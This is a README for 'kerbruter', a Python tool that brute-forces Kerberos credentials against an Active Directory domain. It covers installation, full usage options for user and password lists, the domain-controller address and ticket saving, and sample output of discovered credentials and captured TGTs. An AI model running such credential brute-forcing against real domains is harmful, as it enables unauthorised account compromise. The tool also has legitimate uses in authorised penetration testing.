# kerbruter
A simple python script to bruteforce kerberos built in python

[![forthebadge](https://forthebadge.com/images/badges/made-with-python.svg)](https://forthebadge.com)


# Installation
```
git clone https://github.com/krishpranav/kerbruter
cd kerbruter
python3 -m pip install -r requirements.txt
python3 kerbruter.py
```

# Usage
```
$ python3 kerbruter.py
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

usage: kerbruter.py [-h] [-debug] (-user USER | -users USERS)
                   [-password PASSWORD | -passwords PASSWORDS] -domain DOMAIN
                   [-dc-ip <ip_address>] [-threads THREADS]
                   [-outputfile OUTPUTFILE] [-no-save-ticket]

optional arguments:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -user USER            User to perform bruteforcing
  -users USERS          File with user per line
  -password PASSWORD    Password to perform bruteforcing
  -passwords PASSWORDS  File with password per line
  -domain DOMAIN        Domain to perform bruteforcing
  -dc-ip <ip_address>   IP Address of the domain controller
  -threads THREADS      Number of threads to perform bruteforcing. Default = 1
  -outputfile OUTPUTFILE
                        File to save discovered user:password
  -no-save-ticket       Do not save retrieved TGTs with correct credentials

Examples: 
	./kerbruter.py -users users_file.txt -passwords passwords_file.txt -domain contoso.com
  
```

# Example
```
$ python3 kerbruter.py -domain example.domain -users users.txt -passwords passwords.txt -outputfile example_domain.txt
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

[*] Discovered username & password => example:example
[*] Saved TGT in triceratops.ccache
[*] Valid user => velociraptor [NOT PREAUTH]
[*] Valid user => trex
[*] Saved discovered passwords in jurassic_passwords.txt
```
